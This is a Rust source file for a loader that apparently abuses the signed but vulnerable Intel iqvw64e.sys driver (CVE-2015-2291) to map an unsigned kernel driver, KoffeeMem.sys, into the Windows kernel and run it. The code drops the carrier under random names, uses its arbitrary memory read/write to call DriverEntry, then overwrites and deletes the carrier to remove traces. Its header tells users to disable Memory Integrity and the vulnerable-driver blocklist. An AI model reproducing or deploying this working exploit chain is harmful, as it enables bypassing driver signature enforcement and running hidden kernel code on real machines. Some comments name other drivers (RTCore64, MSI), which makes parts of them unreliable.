//! BYOVD loader: registers the signed Intel iqvw64e.sys carrier (CVE-2015-2291),
//! then manually maps KoffeeMem.sys into kernel pool and calls DriverEntry.
//!
//! Carrier: iqvw64e.sys — official Intel Network Adapter Diagnostic Driver,
//! signed by Microsoft. No test signing, no Secure Boot changes. One buffered
//! IOCTL dispatches on a case number: 0x33 copies between arbitrary
//! addresses, 0x30 fills, 0x25 VA->PA, 0x19/0x1A map/unmap (see rtc.rs).
//! No CR3 discovery, no page-table walking.
//!
//! NOTE: Windows blocks known-vulnerable signed drivers when HVCI/Memory
//! Integrity is on or VulnerableDriverBlocklistEnable=1. Users must have:
//!   - Memory Integrity (HVCI) **off**
//!   - VulnerableDriverBlocklistEnable = 0 in
//!     HKLM\SYSTEM\CurrentControlSet\Control\CI\Config
//!   - Admin rights
//!
//! Entry point: `ensure_loaded()`.  Call this once before opening the
//! DriverTransport.  If the device is already accessible (driver from a
//! previous session still mapped) it's a fast no-op.

pub(crate) mod dbg;
pub(crate) mod kernel;
pub(crate) mod mapper;
pub(crate) mod pe;
pub(crate) mod rtc;
pub(crate) mod svc;

/// Write a diagnostic line into the mirror file (see `dbg::init`).
macro_rules! dlog { ($($a:tt)*) => { crate::loader::dbg::log(format_args!($($a)*)) } }

use std::{
    io,
    path::{Path, PathBuf},
    ptr,
};
use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileA, DefineDosDeviceW, DDD_RAW_TARGET_PATH,
    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};

// ── Embedded driver images ────────────────────────────────────────────────

/// iqvw64e.sys — the signed MSI carrier (kdmapper-shipped BYOVD driver).
/// Loaded via imagepath + NtLoadDriver under its real signature.
const RTC_BYTES: &[u8] = include_bytes!("../../../driver/iqvw64e.sys");

/// Our kernel payload.  Built BEFORE this binary via build.bat (msbuild first).
const SYS_BYTES: &[u8] = include_bytes!("../../../driver/x64/Debug/KoffeeMem.sys");

// ── Device accessibility check ────────────────────────────────────────────

/// Returns `true` if `\\.\KoffeeMem` is already openable (driver already in kernel).
fn device_accessible() -> bool {
    // Ensure the session-local DOS mapping exists first.
    let dev_w: Vec<u16> = "KoffeeMem\0".encode_utf16().collect();
    let tgt_w: Vec<u16> = "\\Device\\KoffeeMem\0".encode_utf16().collect();
    unsafe { DefineDosDeviceW(DDD_RAW_TARGET_PATH, dev_w.as_ptr(), tgt_w.as_ptr()) };

    let h = unsafe {
        CreateFileA(
            b"\\\\.\\KoffeeMem\0".as_ptr(),
            0x8000_0000 | 0x4000_0000, // GENERIC_READ | GENERIC_WRITE
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            ptr::null_mut(),
        )
    };
    if h == INVALID_HANDLE_VALUE || h.is_null() {
        false
    } else {
        unsafe { CloseHandle(h) };
        true
    }
}

// ── Temp file helpers ─────────────────────────────────────────────────────

fn random_name(len: usize) -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0xDEAD_BEEF);
    let chars: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let mut s = String::with_capacity(len);
    let mut v = seed;
    for _ in 0..len {
        v = v.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        s.push(chars[(v >> 33) as usize % chars.len()] as char);
    }
    s
}

fn temp_path() -> PathBuf {
    std::env::var("TEMP")
        .or_else(|_| std::env::var("TMP"))
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("C:\\Windows\\Temp"))
}

fn write_temp_file(prefix: &str, data: &[u8]) -> io::Result<PathBuf> {
    let name = format!("{}{}", prefix, random_name(14));
    let path = temp_path().join(&name);
    std::fs::write(&path, data)?;
    Ok(path)
}

fn overwrite_and_delete(path: &Path) {
    // Overwrite with random-ish data before deleting (kdmapper does this too).
    let junk: Vec<u8> = (0..data_len(path)).map(|i| (i ^ 0xDE) as u8).collect();
    let _ = std::fs::write(path, &junk);
    let _ = std::fs::remove_file(path);
}

fn data_len(path: &Path) -> usize {
    std::fs::metadata(path).map(|m| m.len() as usize).unwrap_or(0x8000)
}

// ── Windows for the carrier ───────────────────────────────────────────────

/// ntoskrnl window: generous, covers whole module + exports + NtAddAtom.
const NTOS_WINDOW: u64 = 0x1000_0000;

// ── Top-level entry point ─────────────────────────────────────────────────

/// Ensure `\\.\KoffeeMem` is accessible, running the full BYOVD load sequence
/// if the driver isn't already in the kernel.
///
/// This is a one-shot call at process startup; subsequent calls are instant
/// no-ops if the device is already up.
pub fn ensure_loaded() -> io::Result<()> {
    if device_accessible() {
        dlog!("loader: device already accessible -- skipping map");
        println!("[+] loader: device already accessible -- skipping map");
        return Ok(());
    }

    dlog!("loader: BYOVD start");
    println!("[+] loader: device not found -- starting BYOVD sequence");

    // 1. Drop iqvw64e.sys to %TEMP% under a random name.
    let rtc_path = write_temp_file("rtc", RTC_BYTES)?;
    dlog!("loader: temp = {}", rtc_path.display());
    println!("[+] loader: iqvw64e.sys → {}", rtc_path.display());

    // 2. Random service name, register + load the carrier.
    let svc_name = random_name(16);
    dlog!("loader: svc_name = {}", svc_name);
    println!("[+] loader: svc_name = {}", svc_name);

    let rtc_path_str = rtc_path.to_str()
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "non-UTF8 temp path"))?
        .to_string();

    dlog!("loader: register_and_start() entered");
    if let Err(e) = svc::register_and_start(&rtc_path_str, &svc_name) {
        dlog!("loader: register_and_start failed: {}", e);
        overwrite_and_delete(&rtc_path);
        return Err(e);
    }
    dlog!("loader: register_and_start ok");
    println!("[+] loader: iqvw64e.sys loaded (svc: {})", svc_name);

    // Helper: full cleanup macro (always called on any error after the
    // carrier is loaded). Takes everything by reference explicitly.
    macro_rules! rtc_cleanup {
        ($dev:expr, $ntos:expr, $pva:expr, $svc:expr, $path:expr) => {{
            if let Some(v) = $pva {
                let _ = $dev.free_pool($ntos, v);
            }
            let _ = &$dev; // borrow is alive; Rtc's Drop closes the device handle
            let _ = svc::stop_and_remove($svc);
            overwrite_and_delete($path);
        }}
    }

    // 3. Open \\.\RTCore64 and register ntoskrnl as the allowed window.
    dlog!("loader: Rtc::open entered");
    let mut rtc_dev = rtc::Rtc::open().map_err(|e| {
        dlog!("loader: Rtc::open failed: {}", e);
        let _ = svc::stop_and_remove(&svc_name);
        overwrite_and_delete(&rtc_path);
        e
    })?;
    dlog!("loader: Rtc::open ok");
    println!("[+] loader: \\.\\Nal opened");

    // 4. Get ntoskrnl base + sanity-check MZ through the carrier.
    let ntos_base = kernel::get_kernel_module_address("ntoskrnl.exe")
        .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "ntoskrnl.exe not in module list"))?;
    println!("[+] loader: ntoskrnl base = 0x{:X}", ntos_base);
    rtc_dev.add_window(ntos_base, NTOS_WINDOW);

    let mut mz = [0u8; 2];
    rtc_dev.read_memory(ntos_base, &mut mz)?;
    if &mz != b"MZ" {
        rtc_cleanup!(&rtc_dev, ntos_base, None::<u64>, &svc_name, &rtc_path);
        return Err(io::Error::new(io::ErrorKind::Other,
            "carrier read sanity check failed: no MZ at ntoskrnl base"));
    }
    println!("[+] loader: ntoskrnl MZ confirmed via carrier");

    // 5. Map KoffeeMem.sys into the kernel.
    let (pool_va, entry_va) = match mapper::map_driver(&mut rtc_dev, ntos_base, SYS_BYTES) {
        Ok(v) => v,
        Err(e) => {
            rtc_cleanup!(&rtc_dev, ntos_base, None::<u64>, &svc_name, &rtc_path);
            return Err(e);
        }
    };
    println!("[+] loader: KoffeeMem.sys mapped at 0x{:X}", pool_va);
    println!("[+] loader: calling DriverEntry at 0x{:X}", entry_va);

    // 6. Call DriverEntry(NULL, NULL).
    let status = match rtc_dev.kernel_call(ntos_base, entry_va, 0, 0, 0, 0) {
        Ok(s) => s,
        Err(e) => {
            rtc_cleanup!(&rtc_dev, ntos_base, Some(pool_va), &svc_name, &rtc_path);
            return Err(e);
        }
    };
    println!("[+] loader: DriverEntry returned 0x{:08X}", status as u32);
    if status < 0 {
        rtc_cleanup!(&rtc_dev, ntos_base, Some(pool_va), &svc_name, &rtc_path);
        return Err(io::Error::new(io::ErrorKind::Other,
            format!("DriverEntry failed: NTSTATUS 0x{:08X}", status as u32)));
    }

    // 7. Unload the carrier and clean up.
    //    DriverEntry queued a work item (ExQueueWorkItem → DelayedWorkQueue).
    //    The worker runs IoCreateDriver on a system thread asynchronously.
    //    800 ms is far more than needed (~50 ms typical); gives margin for load.
    std::thread::sleep(std::time::Duration::from_millis(800));
    rtc_cleanup!(&rtc_dev, ntos_base, None::<u64>, &svc_name, &rtc_path);
    println!("[+] loader: iqvw64e.sys unloaded and erased");

    // 8. Establish session-local DOS mapping for \\.\KoffeeMem.
    //     DriverEntry called IoCreateDriver → IoCreateSymbolicLink may fail from that
    //     context (known Win11 restriction); DefineDosDeviceW always works.
    let dev_w: Vec<u16> = "KoffeeMem\0".encode_utf16().collect();
    let tgt_w: Vec<u16> = "\\Device\\KoffeeMem\0".encode_utf16().collect();
    unsafe { DefineDosDeviceW(DDD_RAW_TARGET_PATH, dev_w.as_ptr(), tgt_w.as_ptr()) };

    // 9. Final check.
    if !device_accessible() {
        return Err(io::Error::new(io::ErrorKind::NotFound,
            "DriverEntry succeeded but \\.\\KoffeeMem is still not accessible. \
             Check DbgView for [KoffeeMem] log lines."));
    }

    println!("[+] loader: \\.\\KoffeeMem is up -- BYOVD complete");
    Ok(())
}